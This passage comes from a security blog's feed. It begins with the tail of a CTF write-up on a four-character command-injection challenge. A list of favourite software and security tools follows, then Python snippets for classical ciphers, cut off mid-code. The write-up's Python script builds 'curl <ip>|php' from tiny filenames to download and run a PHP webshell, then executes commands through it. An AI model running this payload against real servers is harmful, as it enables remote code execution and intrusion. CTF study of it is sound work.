shell_ip.split(<span class="string">'.'</span>)])</span><br><span class="line"> </span><br><span class="line">reset = target + <span class="string">'?reset'</span></span><br><span class="line">cmd = target + <span class="string">'?cmd='</span></span><br><span class="line">sandbox = target + <span class="string">'sandbox/'</span> + </span><br><span class="line">    hashlib.md5(<span class="string">'orange'</span> + your_ip).hexdigest() + <span class="string">'/'</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># payload某些位置的可选字符</span></span><br><span class="line">pos0 = random.choice(<span class="string">'efgh'</span>)</span><br><span class="line">pos1 = random.choice(<span class="string">'hkpq'</span>)</span><br><span class="line">pos2 = <span class="string">'g'</span>  <span class="comment"># 随意选择字符</span></span><br><span class="line"> </span><br><span class="line">payload = [</span><br><span class="line">    <span class="string">'&gt;dir'</span>,</span><br><span class="line">    <span class="comment"># 创建名为 dir 的文件</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">'&gt;%s&gt;'</span> % pos0,</span><br><span class="line">    <span class="comment"># 假设pos0选择 f , 创建名为 f&gt; 的文件</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">'&gt;%st-'</span> % pos1,</span><br><span class="line">    <span class="comment"># 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1，</span></span><br><span class="line">    <span class="comment"># 因为alphabetical序中t&gt;s</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">'&gt;sl'</span>,</span><br><span class="line">    <span class="comment"># 创建名为 &gt;sl 的文件；到此处有四个文件，</span></span><br><span class="line">    <span class="comment"># ls 的结果会是：dir f&gt; kt- sl</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">'*&gt;v'</span>,</span><br><span class="line">    <span class="comment"># 前文提到， * 相当于 `ls` ，那么这条命令等价于 `dir f&gt; kt- sl`&gt;v ，</span></span><br><span class="line">    <span class="comment">#  前面提到dir是不换行的，所以这时会创建文件 v 并写入 f&gt; kt- sl</span></span><br><span class="line">    <span class="comment"># 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">'&gt;rev'</span>,</span><br><span class="line">    <span class="comment"># 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f&gt; kt- rev sl v</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">'*v&gt;%s'</span> % pos2,</span><br><span class="line">    <span class="comment"># 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。前文也提过了，体会一下。</span></span><br><span class="line">    <span class="comment"># 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk &gt; f</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 续行分割 curl 0x11223344|php 并逆序写入</span></span><br><span class="line">    <span class="string">'&gt;p'</span>,</span><br><span class="line">    <span class="string">'&gt;ph\',</span></span><br><span class="line"><span class="string">    '</span>&gt;|\<span class="string">',</span></span><br><span class="line"><span class="string">    '</span>&gt;%s\<span class="string">' % ip[8:10],</span></span><br><span class="line"><span class="string">    '</span>&gt;%s\<span class="string">' % ip[6:8],</span></span><br><span class="line"><span class="string">    '</span>&gt;%s\<span class="string">' % ip[4:6],</span></span><br><span class="line"><span class="string">    '</span>&gt;%s\<span class="string">' % ip[2:4],</span></span><br><span class="line"><span class="string">    '</span>&gt;%s\<span class="string">' % ip[0:2],</span></span><br><span class="line"><span class="string">    '</span>&gt; \<span class="string">',</span></span><br><span class="line"><span class="string">    '</span>&gt;rl\<span class="string">',</span></span><br><span class="line"><span class="string">    '</span>&gt;cu\<span class="string">',</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    '</span>sh <span class="string">' + pos2,</span></span><br><span class="line"><span class="string">    # sh g ;g 的内容是 ls -tk &gt; f ，那么就会把逆序的命令反转回来，</span></span><br><span class="line"><span class="string">    # 虽然 f 的文件头部会有杂质，但不影响有效命令的执行</span></span><br><span class="line"><span class="string">    '</span>sh <span class="string">' + pos0,</span></span><br><span class="line"><span class="string">    # sh f 执行curl命令，下载文件，写入木马。</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">s = r.get(reset)</span></span><br><span class="line"><span class="string">for i in payload:</span></span><br><span class="line"><span class="string">    assert len(i) &lt;= 4</span></span><br><span class="line"><span class="string">    s = r.get(cmd + i)</span></span><br><span class="line"><span class="string">    print '</span>[%d]<span class="string">' % s.status_code, s.url</span></span><br><span class="line"><span class="string">    sleep(0.1)</span></span><br><span class="line">s = r.get(sandbox + 'fun.php?cmd=uname -a')</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[%d]'</span> % s.status_code, s.url</span><br><span class="line"><span class="keyword">print</span> s.text</span><br></pre></td></tr></table></figure><h4 id="运行效果-1"><a href="#运行效果-1" class="headerlink" title="运行效果"></a>运行效果</h4><p><img src="t01d42702502e8f186e.png" alt="http://p8.qhimg.com/t01b1145c403a84ced2.png"></p><hr><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a><strong>后记</strong></h3><p>我相信除了文中给出的方法外一定还有一些奇招，大家可以多多探索，可以围观HITCON CTF 2107的<a href="http://t.cn/RlNVPfp" target="_blank" rel="noopener">官方解答区</a>，还可以学习下Phithon师傅的《<a href="http://t.cn/RlNcllC" target="_blank" rel="noopener">小密圈里的那些奇技淫巧</a>》 中与本文主题相关的部分。</p><p>最后，如果关于文章内容有任何建议或疑惑，你可以在<a href="https://findneo.github.io/">https://findneo.github.io/</a> 联系本文作者。感谢阅读o/</p><hr><p>本文由<strong>安全客</strong>原创发布<br>如若转载，请注明出处： <a href="https://www.anquanke.com/post/id/87203" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87203</a></p><p>安全客 - 有思想的安全新媒体</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>利器</title>
      <link href="/171103ComputerTools/"/>
      <url>/171103ComputerTools/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://github.com/findneo/computerTools" target="_blank" rel="noopener">https://github.com/findneo/computerTools</a></p></blockquote><h3 id="系统优化类"><a href="#系统优化类" class="headerlink" title="系统优化类"></a>系统优化类</h3><p><a href="http://www.voidtools.com/" target="_blank" rel="noopener">everything</a> 本地文件全盘搜索。</p><p><a href="https://www.mythicsoft.com/agentransack/download" target="_blank" rel="noopener">agentransack</a> 本地文档全文搜索。</p><p><a href="https://www.mythicsoft.com/filelocatorpro/download" target="_blank" rel="noopener">filelocator</a>  付费版本地文档全文搜索。</p><p><a href="https://notepad-plus-plus.org/" target="_blank" rel="noopener">notepad++</a> 轻量却强大的文本编辑器，支持插件扩展和很多自定义项。</p><p>​    插件推荐：</p><ul><li>markdownviewer++ 预览md文件</li><li>php autocompletion</li><li>emmet</li></ul><p>Resilio Sync 就像，不限容，不限速，无审查的云盘 。 </p><p>teleport ultra 全站克隆到本地 。</p><p><a href="https://iobit-uninstaller.en.softonic.com/" target="_blank" rel="noopener">iobitUninstaller</a>  程序彻底卸载。</p><p><a href="http://down.sandai.net/thunderspeed/ThunderSpeed1.0.34.360.exe" target="_blank" rel="noopener">迅雷极速版7.10.34.360</a>      存粹的下载器。</p><p><a href="https://github.com/shadowsocks" target="_blank" rel="noopener">shadowsocks</a>    代理工具，更方便地访问互联网。</p><p><a href="http://www.splayer.org/" target="_blank" rel="noopener">splayer</a>  本地视音频播放器，无广告，可自动搜索影片字幕。已停更。</p><p><a href="http://potplayer.daum.net/?lang=zh_CN" target="_blank" rel="noopener">potplayer</a> 强大的影音播放器。</p><p> <del><a href="https://justgetflux.com/" target="_blank" rel="noopener">f.lux</a></del>  自动调节电脑屏幕色温，保护视力。win10创意者更新中已集成到系统 。</p><p><a href="http://www.443w.com/hu/" target="_blank" rel="noopener">护眼啦</a> 定时提醒休息。高于1.6的某些版本会报毒。可自行<a href="https://www.google.com/search?q=%E6%8A%A4%E7%9C%BC%E5%95%A6+1.6" target="_blank" rel="noopener">谷歌</a> 或 <a href="https://www.baidu.com/s?wd=%E6%8A%A4%E7%9C%BC%E5%95%A6%2B1.6" target="_blank" rel="noopener">百度</a> 下载低版本。</p><p><a href="http://forum.ubuntu.org.cn/viewtopic.php?f=137&amp;t=392969" target="_blank" rel="noopener">eyerest</a>  ubuntu下的护眼工具。</p><p>foxmail邮箱客户端，RSS功能也不错。</p><p><a href="http://dir.jjol.cn/Pyjj/index.aspx" target="_blank" rel="noopener">加加输入法</a> 文明和谐的输入法。</p><p><a href="http://www.7-zip.org/" target="_blank" rel="noopener">7zip</a> 开源免费无广告的压缩工具。</p><p>win10锁屏壁纸所在文件夹<code>(C:\Users\\++username++\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets)</code></p><p>谷歌浏览器 <a href="http://www.google.cn/chrome/browser/desktop/index.html" target="_blank" rel="noopener">中文版</a>,<a href="https://www.google.com/chrome/browser/desktop/index.html?hl=en" target="_blank" rel="noopener">英文版</a> </p><p>插件推荐：</p><ul><li><a href="https://chrome.google.com/webstore/detail/octotree/bkhaagjahfmjljalopjnoealnfndnagc" target="_blank" rel="noopener">octotree</a>   github目录树查看。</li><li><a href="https://chrome.google.com/webstore/search/adblock" target="_blank" rel="noopener">adblock</a>   拦截广告</li><li>印象笔记</li><li>cookiesmanager </li><li>shodan</li><li><a href="https://github.com/listen1/listen1_chrome_extension" target="_blank" rel="noopener">listen1</a>集成多平台歌源，下载压缩包并解压后以chrome开发者模式加载</li><li><a href="http://tampermonkey.net/index.php?version=4.2.7&amp;ext=dhdg&amp;show=dhdg" target="_blank" rel="noopener">tamperMonkey</a><ul><li><a href="https://greasyfork.org/zh-CN/scripts/12758-youdaodict" target="_blank" rel="noopener">有道取词1.4</a>  </li><li><a href="https://greasyfork.org/zh-CN/scripts/" target="_blank" rel="noopener">更多脚本</a></li></ul></li></ul><p>火狐浏览器</p><p>插件推荐：</p><ul><li>印象笔记  </li><li><a href="https://addons.mozilla.org/zh-CN/firefox/addon/greasemonkey/?src=search" target="_blank" rel="noopener">GreasyMonkey</a>   <ul><li><a href="https://greasyfork.org/zh-CN/scripts/12758-youdaodict" target="_blank" rel="noopener">有道取词1.4</a>  </li><li><a href="https://greasyfork.org/zh-CN/scripts/" target="_blank" rel="noopener">更多脚本</a>  </li></ul></li><li>Hack Bar  </li><li>firebug  </li><li>uBlock Origin  </li><li>Bookmark Dedulplicator  </li><li>add to wunderlist  </li><li>Tamper Data拦截修改  </li><li>Modify Headers修改头部  </li><li>AutoProxy  </li><li>NoScript  </li><li>Live Http Header</li></ul><p>markdown相关:</p><ul><li><a href="https://maxiang.io/" target="_blank" rel="noopener">马克飞象</a> </li><li><a href="http://markdownpad.com/" target="_blank" rel="noopener">markdownPad2</a> 右侧即时预览的markdown编辑器</li><li><a href="https://typora.io/" target="_blank" rel="noopener">typora</a> 所见即所得的markdown编辑器</li></ul><p>文件同步：</p><ul><li><a href="https://allwaysync.com/" target="_blank" rel="noopener">allwaysync</a> </li><li><a href="https://www.jianguoyun.com/" target="_blank" rel="noopener">坚果云</a> </li></ul><p><a href="http://www.dopdf.com/quick-download.php" target="_blank" rel="noopener">dopdf</a>  其他格式文件转pdf，效果不错。</p><p>telegram 即时通讯工具，被墙。</p><p> <a href="http://xianshuhua2.blog.163.com/blog/static/99760751201362854753660/" target="_blank" rel="noopener">WPS Office 2013 个人版</a>  </p><h3 id="学习相关类"><a href="#学习相关类" class="headerlink" title="学习相关类"></a>学习相关类</h3><p><a href="https://www.yinxiang.com/" target="_blank" rel="noopener">印象笔记</a> </p><p><a href="https://www.sumatrapdfreader.org/free-pdf-reader.html" target="_blank" rel="noopener">sumatraPdf</a>  小巧好用的PDF阅读器，已停更。</p><p><a href="https://www.foxitsoftware.cn/downloads/" target="_blank" rel="noopener">福昕(xin)pdf阅读器</a> </p><p><a href="https://sourceforge.net/projects/freemind/" target="_blank" rel="noopener">freemind</a>  开源的思维导图工具。</p><p><a href="http://goldendict.org/" target="_blank" rel="noopener">goldenDict</a> 离线词典。</p><p><a href="http://todotxt.org/" target="_blank" rel="noopener">todotxt</a>，纯文本GTD工具。</p><p>calibre 书籍管理，azw阅读器很棒 。</p><p> <a href="http://www.wjjsoft.com/index_chs.html" target="_blank" rel="noopener">myBase</a> 知识管理。</p><p><a href="https://zealdocs.org/" target="_blank" rel="noopener">zeal</a> 离线文档查询。</p><p>Cisco Packet Tracer Student，路由模拟器。</p><p>GNS3 数据通信模拟器。</p><h3 id="开发相关类"><a href="#开发相关类" class="headerlink" title="开发相关类"></a>开发相关类</h3><p>visual studio code </p><p><a href="http://www.sublimetext.com/" target="_blank" rel="noopener">sublimeText</a> 功能齐全，好看。</p><ul><li>插件HTML-CSS-JS Prettify </li><li>jedi ：python自动补全</li><li>anaconda </li><li>Localization汉化 </li><li>ConvertToUTF8解决编码问题 </li><li>Bracket Highlighter匹配括号，引号和html标签。 </li><li>DocBlockr　自动生成PHPDoc风格的注释。支持的js, PHP, ActionScript, CoffeeScript, Java, Objective C, C, C++ </li><li>Emmet(Zen Coding)　快速生成HTML代码段的插件,很强大。比如试试html:4s </li><li>其它相关 <a href="https://github.com/jikeytang/sublime-text" target="_blank" rel="noopener">https://github.com/jikeytang/sublime-text</a> </li></ul><p>devcpp </p><p>wing IDE python 集成开发环境</p><p>git 版本管理</p><p>远程管理</p><ul><li><a href="https://mobaxterm.mobatek.net/" target="_blank" rel="noopener">MobaXterm</a> 强大，方便，好看。</li><li>winscp</li><li>real VNC</li><li>xshell </li><li>secureCRT</li><li><a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html" target="_blank" rel="noopener">putty</a> </li><li>teamviewer</li><li><a href="https://github.com/epinna/weevely3" target="_blank" rel="noopener">weevely</a></li><li>中国菜刀</li></ul><p>本地环境搭建</p><ul><li>wamp </li><li>phpstudy </li></ul><p>source insight </p><p>matlab </p><p>jre/jdk </p><p>python/anaconda </p><p>wsl </p><p>linux </p><ul><li>fish shell </li><li>zsh shell </li></ul><h3 id="安全类"><a href="#安全类" class="headerlink" title="安全类"></a>安全类</h3><p>winhex </p><p>010editor</p><p>zip压缩文件爆破</p><ul><li>advanced zip password recovery </li><li>ziperello </li></ul><p>御剑 </p><p>awvs</p><p>nmap</p><p>sqlmap </p><p>burpsuite </p><p>wireshark </p><p>fiddler</p><p>OD </p><p>IDAPRO </p><p>OWASP Mantra Janus</p><p>MoC en 0.3 Alpha</p><p>seay代码审计系统</p><p>virtual box开源的虚拟机软件，内存占用较小</p><p>vmware </p><ul><li>kali </li><li>backtrack </li><li>52pojie虚拟机 </li><li>xampp+dvwa </li><li>Metasploitable-linux </li><li>OWASP_Broken_Web_Apps_VM </li><li>SEEDUbuntu </li><li>web for pentester </li><li>WebGoat-OWASP_standard_win32 </li></ul><h3 id="小工具"><a href="#小工具" class="headerlink" title="小工具"></a>小工具</h3><ul><li><a href="https://technet.microsoft.com/en-us/sysinternals/bb897441.aspx" target="_blank" rel="noopener">微软的签名检查命令行工具sigcheck</a> </li><li><a href="https://support.microsoft.com/zh-cn/help/841290/availability-and-description-of-the-file-checksum-integrity-verifier-utility" target="_blank" rel="noopener">微软的命令行校验工具fciv</a> </li><li>HXD十六进制编辑器 </li><li>截图工具<a href="https://zh.snipaste.com/download.html" target="_blank" rel="noopener">snipaste</a> </li><li>硬件信息检测<a href="http://dl.pconline.com.cn/html_2/1/60/id=786&amp;pn=0.html" target="_blank" rel="noopener">CPU-Z</a></li></ul><h3 id="好的在线工具"><a href="#好的在线工具" class="headerlink" title="好的在线工具"></a>好的在线工具</h3><ul><li><a href="https://hackmd.io/" target="_blank" rel="noopener">markdown协作</a></li><li><a href="http://notepad.live" target="_blank" rel="noopener">文本共享</a></li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>用python实现几种常见简单加密</title>
      <link href="/171015PythonSnippets/"/>
      <url>/171015PythonSnippets/</url>
      
        <content type="html"><![CDATA[<h3 id="栅栏密码加解密"><a href="#栅栏密码加解密" class="headerlink" title="栅栏密码加解密"></a>栅栏密码加解密</h3><h4 id="单行版本"><a href="#单行版本" class="headerlink" title="单行版本"></a>单行版本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">railFence = <span class="keyword">lambda</span> s: [[i, <span class="string">''</span>.join([s[k * i + j] <span class="keyword">for</span> j <span class="keyword">in</span> range(i) <span class="keyword">for</span> k <span class="keyword">in</span> range(len(s) / i)])] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(s)) <span class="keyword">if</span> <span class="keyword">not</span> len(s) % i]</span><br><span class="line"><span class="keyword">print</span> railFence(<span class="string">'hello world , 2017 ! '</span>)</span><br></pre></td></tr></table></figure><h4 id="正常版本"><a href="#正常版本" class="headerlink" title="正常版本"></a>正常版本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">railFence</span><span class="params">(s)</span>:</span></span><br><span class="line">    ll = len(s)</span><br><span class="line">    res = dict()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, ll):</span><br><span class="line">        r = <span class="string">''</span></span><br><span class="line">        <span class="keyword">if</span> ll % i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(i):</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> range(ll / i):</span><br><span class="line">                    r += s[k * i + j]</span><br><span class="line">            res[i] = r</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># test</span></span><br><span class="line"><span class="keyword">print</span> railFence(<span class="string">'hello world , 2017 ! '</span>)</span><br><span class="line"><span class="comment"># &#123;1: 'hello world , 2017 ! ', 3: 'hlwl,0 eood 1!l r 27 ', 7: 'ho2er0ll1ld7o   ,!w  '&#125;</span></span><br></pre></td></tr></table></figure><h3 id="凯撒密码加解密"><a href="#凯撒密码加解密" class="headerlink" title="凯撒密码加解密"></a>凯撒密码加解密</h3><h4 id="单行版本-1"><a href="#单行版本-1" class="headerlink" title="单行版本"></a>单行版本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">caesar</span><span class="params">(s)</span>:</span> <span class="keyword">return</span> [[off, <span class="string">''</span>.join([chr((ord(i) - <span class="number">97</span> + off) % <span class="number">26</span> + <span class="number">97</span>) <span class="keyword">if</span> <span class="string">'a'</span> &lt;= i &lt;= <span class="string">'z'</span> <span class="keyword">else</span> chr((ord(i) - <span class="number">65</span> + off) % <span class="number">26</span> + <span class="number">65</span>) <span class="keyword">if</span> <span class="string">'A'</span> &lt;= i &lt;= <span class="string">'Z'</span> <span class="keyword">else</span> i <span class="keyword">for</span> i <span class="keyword">in</span> str(s)])] <span class="keyword">for</span> off <span class="keyword">in</span> range(<span class="number">26</span>)]</span><br><span class="line"><span class="keyword">print</span> caesar(<span class="string">'h3llo'</span>)</span><br></pre></td></tr></table></figure><h4 id="正常版本-1"><a href="#正常版本-1" class="headerlink" title="正常版本"></a>正常版本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">caesar</span><span class="params">(s)</span>:</span></span><br><span class="line">    cycle = <span class="number">26</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">        r = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> str(s):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'a'</span> &lt;= i &lt;= <span class="string">'z'</span>:</span><br><span class="line">                r += chr((ord(i) - ord(<span class="string">'a'</span>) + offset) % cycle + ord(<span class="string">'a'</span>))</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">'A'</span> &lt;= i &lt;= <span class="string">'Z'</span>:</span><br><span class="line">                r += chr((ord(i) - ord(<span class="string">'A'</span>) + offset) % cycle + ord(<span class="string">'A'</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                r += i</span><br><span class="line">        res.append([offset, r])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># test</span></span><br><span class="line"><span class="keyword">print</span> caesar(<span class="string">'h3llo'</span>)</span><br><span class="line"><span class="comment">#[  [0, 'h3llo'], [1, 'i3mmp'], [2, 'j3nnq'], [3, 'k3oor'], [4, 'l3pps'], [5, 'm3qqt'], [6, 'n3rru'], [7, 'o3ssv'],</span></span><br><span class="line"><span class="comment">#   [8, 'p3ttw'], [9, 'q3uux'], [10, 'r3vvy'], [11, 's3wwz'], [12, 't3xxa'], [13, 'u3yyb'], [14, 'v3zzc'],</span></span><br><span class="line"><span class="comment">#   [15, 'w3aad'], [16, 'x3bbe'], [17, 'y3ccf'], [18, 'z3ddg'], [19, 'a3eeh'], [20, 'b3ffi'], [21, 'c3ggj'],</span></span><br><span class="line"><span class="comment">#   [22, 'd3hhk'], [23, 'e3iil'], [24, 'f3jjm'], [25, 'g3kkn']]</span></span><br></pre></td></tr></table></figure><h3 id="莫尔斯电码加解密"><a href="#莫尔斯电码加解密" class="headerlink" title="莫尔斯电码加解密"></a>莫尔斯电码加解密</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">morse</span><span class="params">(s)</span>:</span></span><br><span class="line">    morseChart = [<span class="string">'.-'</span>,       <span class="string">'-...'</span>,     <span class="string">'-.-.'</span>,     <span class="string">'-..'</span>,      <span class="string">'.'</span>,        <span class="string">'..-.'</span>,     <span class="string">'--.'</span>,</span><br><span class="line">                  <span class="string">'....'</span>,     <span class="string">'..'</span>,       <span class="string">'.---'</span>,     <span class="string">'-.-'</span>,      <span class="string">'.-..'</span>,     <span class="string">'--'</span>,       <span class="string">'-.'</span>,</span><br><span class="line">                  <span class="string">'---'</span>,      <span class="string">'.--.'</span>,     <span class="string">'--.-'</span>,     <span class="string">'.-.'</span>,      <span class="string">'...'</span>,      <span class="string">'-'</span>,        <span class="string">'..-'</span>,</span><br><span class="line">                  <span class="string">'...-'</span>,     <span class="string">'.--'</span>,      <span class="string">'-..-'</span>,     <span class="string">'-.--'</span>,     <span class="string">'--..'</span>,     <span class="string">'-----'</span>,    <span class="string">'.----'</span>,</span><br><span class="line">                  <span class="string">'..---'</span>,    <span class="string">'...--'</span>,    <span class="string">'....-'</span>,    <span class="string">'.....'</span>,    <span class="string">'-....'</span>,    <span class="string">'--...'</span>,    <span class="string">'---..'</span>,</span><br><span class="line">                  <span class="string">'----.'</span>,    <span class="string">'.-.-.-'</span>,   <span class="string">'--..--'</span>,   <span class="string">'..--..'</span>,   <span class="string">'-....-'</span>,   <span class="string">'.----.'</span>,   <span class="string">'---...'</span>,</span><br><span class="line">                  <span class="string">'.-..-.'</span>,   <span class="string">'-..-.'</span>,    <span class="string">'.--.-.'</span>,   <span class="string">'-.-.-.'</span>,   <span class="string">'-...-'</span>,    <span class="string">'-.-.--'</span>,   <span class="string">'..--.-'</span>,</span><br><span class="line">                  <span class="string">'-.--.'</span>,    <span class="string">'-.--.-'</span>,   <span class="string">'...-..-'</span>,  <span class="string">'.-...'</span>,    <span class="string">'.-.-.'</span>,    <span class="string">' '</span>,        <span class="string">'*'</span></span><br><span class="line">                  ]</span><br><span class="line">    alphaChart = [<span class="string">'a'</span>,        <span class="string">'b'</span>,        <span class="string">'c'</span>,        <span class="string">'d'</span>,        <span class="string">'e'</span>,        <span class="string">'f'</span>,        <span class="string">'g'</span>,</span><br><span class="line">                  <span class="string">'h'</span>,        <span class="string">'i'</span>,        <span class="string">'j'</span>,        <span class="string">'k'</span>,        <span class="string">'l'</span>,        <span class="string">'m'</span>,        <span class="string">'n'</span>,</span><br><span class="line">                  <span class="string">'o'</span>,        <span class="string">'p'</span>,        <span class="string">'q'</span>,        <span class="string">'r'</span>,        <span class="string">'s'</span>,        <span class="string">'t'</span>,        <span class="string">'u'</span>,</span><br><span class="line">                  <span class="string">'v'</span>,        <span class="string">'w'</span>,        <span class="string">'x'</span>,        <span class="string">'y'</span>,        <span class="string">'z'</span>,        <span class="string">'0'</span>,        <span class="string">'1'</span>,</span><br><span class="line">                  <span class="string">'2'</span>,        <span class="string">'3'</span>,        <span class="string">'4'</span>,        <span class="string">'5'</span>,        <span class="string">'6'</span>,        <span class="string">'7'</span>,        <span class="string">'8'</span>,</span><br><span class="line">                  <span class="string">'9'</span>,        <span class="string">'.'</span>,        <span class="string">','</span>,        <span class="string">'?'</span>,        <span class="string">'-'</span>,        <span class="string">"'"</span>,        <span class="string">':'</span>,</span><br><span class="line">                  <span class="string">'"'</span>,        <span class="string">'/'</span>,        <span class="string">'@'</span>,        <span class="string">';'</span>,        <span class="string">'='</span>,        <span class="string">'!'</span>,        <span class="string">'_'</span>,</span><br><span class="line">                  <span class="string">'('</span>,        <span class="string">')'</span>,        <span class="string">'$'</span>,        <span class="string">'&amp;'</span>,        <span class="string">'+'</span>,        <span class="string">' '</span>,        <span class="string">'#'</span></span><br><span class="line">                  ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># or as a dict -&gt;  &#123;c[1][i]: c[0][i] for i in xrange(len(c[0]))&#125;</span></span><br><span class="line">    c = [morseChart, alphaChart]</span><br><span class="line"></span><br><span class="line">    s = s.lower()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># replace characters not in alphaChart with '#' ,which shall be '*' in</span></span><br><span class="line">    <span class="comment"># encoded string</span></span><br><span class="line">    s = re.sub(<span class="string">'[^a-z0-9.,?\-\':"/@;=!_()$&amp;+ ]'</span>, <span class="string">'#'</span>, s)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># for convenience sake, I choose not to deal with space in morse.</span></span><br><span class="line">    s = re.sub(<span class="string">'\s+'</span>, <span class="string">' '</span>, s)</span><br><span class="line"></span><br><span class="line">    m = <span class="number">1</span>  <span class="comment"># default to decode</span></span><br><span class="line">    <span class="comment"># if mot mismatch that condition,we are to encode.</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.match(<span class="string">'[^-._ ]'</span>, s):</span><br><span class="line">        <span class="comment"># occasionally we meet [ ._]+ instead of [ .-]+</span></span><br><span class="line">        s = s.replace(<span class="string">'_'</span>, <span class="string">'-'</span>)</span><br><span class="line">        s = re.split(<span class="string">' '</span>, s)</span><br><span class="line">        m = <span class="number">0</span>  <span class="comment"># we are  to encode by morse</span></span><br><span class="line"></span><br><span class="line">    r = []</span><br><span class="line">    <span class="comment"># list().extend(foo) returns None so we use 'or r'</span></span><br><span class="line">    <span class="keyword">return</span> (m * <span class="string">' '</span>).join(r.extend([c[<span class="number">1</span> - m][c[m].index(i)] <span class="keyword">for</span> i <span class="keyword">in</span> s]) <span class="keyword">or</span> r)</span><br><span class="line"></span><br><span class="line"><span class="comment"># test</span></span><br><span class="line"><span class="keyword">print</span> morse(<span class="string">'Hello word,2017!'</span>)</span><br><span class="line"><span class="keyword">print</span> morse(<span class="string">'.... . .-.. .-.. ---   .-- --- .-. -.. --..-- ..--- ----- .---- --... -.-.--'</span>)</span><br></pre></td></tr></table></figure><h3 id="base64混合编码"><a href="#base64混合编码" class="headerlink" title="base64混合编码"></a>base64混合编码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 